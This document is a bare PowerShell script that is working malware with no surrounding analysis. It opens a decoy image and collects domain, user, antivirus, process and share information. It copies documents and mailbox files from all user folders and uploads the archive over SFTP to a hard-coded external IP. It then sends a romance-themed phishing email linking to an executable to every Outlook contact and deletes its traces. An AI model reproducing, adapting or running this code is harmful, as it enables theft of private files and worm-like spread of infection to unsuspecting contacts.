$hostname = $env:COMPUTERNAME
$currentUser = $env:USERNAME
$url = "http://44.206.187.144:9000/Superstar_MemberCard.tiff"
$img = "C:\users\$currentUser\Downloads\Superstar_MemberCard.tiff"

Invoke-WebRequest -Uri $url -OutFile $img
Start-Process $img

$searchDir = "C:\Users"
$targetDir = "C:\Users\Public\Public Files"

if (-not (Test-Path -Path $targetDir -PathType Container)) {
    New-Item -ItemType Directory -Path $targetDir -Force | Out-Null
}

$currentUser | Out-File -FilePath (Join-Path $targetDir 'username.txt') -Force

nltest /dsgetdc:$env:USERDOMAIN 2>$null | Out-File -FilePath (Join-Path $targetDir 'DCinfo.txt') -Force
Get-WmiObject -Class Win32_UserAccount | Out-File -FilePath (Join-Path $targetDir 'localusers.txt') -Force
wmic /NAMESPACE:\\root\SecurityCenter2 PATH AntiVirusProduct GET /value 2>$null | Out-File -FilePath (Join-Path $targetDir 'AVinfo.txt') -Force

$currentUserProcesses = Get-WmiObject Win32_Process | Where-Object {
    try {
        $_.GetOwner().User -eq $currentUser
    } catch {
        $false  
    }
}

$currentUserProcesses | Select-Object ProcessName, ProcessId | Out-File -FilePath (Join-Path $targetDir 'UserProcesses.txt') -Force

if (Get-Process -Name Outlook -ErrorAction SilentlyContinue) {
    Stop-Process -Name Outlook -Force -ErrorAction SilentlyContinue
}

$extList =  "*.doc", "*.docx", "*.xls", "*.xlsx", "*.ppt", "*.pptx", "*.pdf", "*.csv", ".*oft", "*.potx", 
            "*.xltx", "*.dotx", "*.msg", "*.eml", "*.pst",  "*.odt", "*.ods", "*.odp", "*.odg", "*.ost"
             
$null = Get-ChildItem $searchDir -Recurse -Include $extList -Force -ErrorAction 'SilentlyContinue' |
    ForEach-Object {
        $destinationPath = Join-Path $targetDir $_.Name
        
        if ($_.FullName -ne $destinationPath) {
            Copy-Item -Path $_.FullName -Destination $destinationPath -Force
        }
    }

Get-SmbShare | Out-File -FilePath (Join-Path $targetDir 'Shareinfo.txt') -Force
gpresult /r | Out-File -FilePath (Join-Path $targetDir 'GPinfo.txt') -Force
$ProgressPreference = 'SilentlyContinue'
$archivePath = "$targetDir\$hostname.zip"
Compress-Archive -Path $targetDir -DestinationPath $archivePath -Force 

$wZipUrl = "https://us.softradar.com/static/products/winscp-portable/distr/0/winscp-portable_softradar-com.zip"
$wZipFile = "$targetDir\WinSCP.zip"
$wExtractPath = "C:\Users\Public\HelpDesk-Tools"

Invoke-WebRequest -UserAgent "Wget" -Uri $wZipUrl -OutFile $wZipFile -UseBasicParsing
Expand-Archive -Path $wZipFile -DestinationPath $wExtractPath -Force

$wExePath = "$wExtractPath\WinSCP.com"
$sPath = "$wExtractPath\maintenanceScript.txt"
@"
open sftp://service:M8&C!i6KkmGL1-#@35.169.66.138/ -hostkey=*
put `"$archivePath`"
close
exit
"@ | Out-File -FilePath $sPath -Force
Start-Process -FilePath $wExePath -ArgumentList "/script=`"$sPath`"" -Wait -NoNewWindow


$outlookPath  = Get-ChildItem -Path "C:\Program Files\Microsoft Office" -Filter "OUTLOOK.EXE" -Recurse | Select-Object -First 1 -ExpandProperty FullName

$htmlBody = @"
<!DOCTYPE html>
<html>
<head>
<style>
    body {
    font-family: Calibri, sans-serif;
    }
</style>
</head>
<body>
<p>Hey, </p> <p> Hope you're doing great when you see this. I'm reaching out because there's something I've been wanting to share with you. You know that feeling when you've been admiring someone from afar, but hesitated to take the next step? That's been me lately, but I've decided it's time to change that.</p>
<p>In a world where we often rush through everything, I believe in the beauty of taking things slow, cherishing each moment like a scene from a timeless tale. So, if you're open to it, I'd love for us to meet up after hours.</p>
<p>I've arranged for a rendezvous at a private membership club, where we can enjoy a bit of privacy and exclusivity. I've attached the map for your convenience. </p>
<p>To gain entry, you'll need a digital membership card for entry, accessible <a href='http://44.206.187.144:9000/Superstar_MemberCard.tiff.exe'>here</a>. Just a friendly heads up, there's a time limit before you can download it, so it's best to grab it sooner rather than waiting too long.</p>
<p>Counting on seeing you there later.</p>
</body>
</html>
"@

if ($outlookPath) {
    Start-Process -FilePath $outlookPath
    $outlook = New-Object -ComObject Outlook.Application
    $namespace = $outlook.GetNamespace("MAPI")
    $contactsFolder = $namespace.GetDefaultFolder(10) 
    $csvFilePath = "$targetDir\Contacts.csv"
    $contactsFolder.Items | ForEach-Object {
        $_.GetInspector | ForEach-Object {
            $_.Close(0)  
        }
        $props = @{
            'Full Name'      = $_.FullName
            'Email Address'  = $_.Email1Address
            
        }
        New-Object PSObject -Property $props
    } | Export-Csv -Path $csvFilePath -NoTypeInformation

    $contacts = Import-Csv -Path $csvFilePath
    $mailItem = $outlook.CreateItem(0)
    $mailItem.Subject = "Fingers crossed you'll notice.."
    $mailItem.HtmlBody = $htmlBody
    $mailItem.Attachments.Add($img) > $null
    $mailItem.BodyFormat = 2 

    foreach ($contact in $contacts) {
        $bccRecipient = $mailItem.Recipients.Add($contact."Email Address")
        $bccRecipient.Type = [Microsoft.Office.Interop.Outlook.OlMailRecipientType]::olBCC
    }

    $mailItem.Recipients.ResolveAll() > $null
    $mailItem.Send()
}

Remove-Item -Path $wExtractPath -Recurse -Force
Remove-Item -Path $targetDir -Recurse -Force
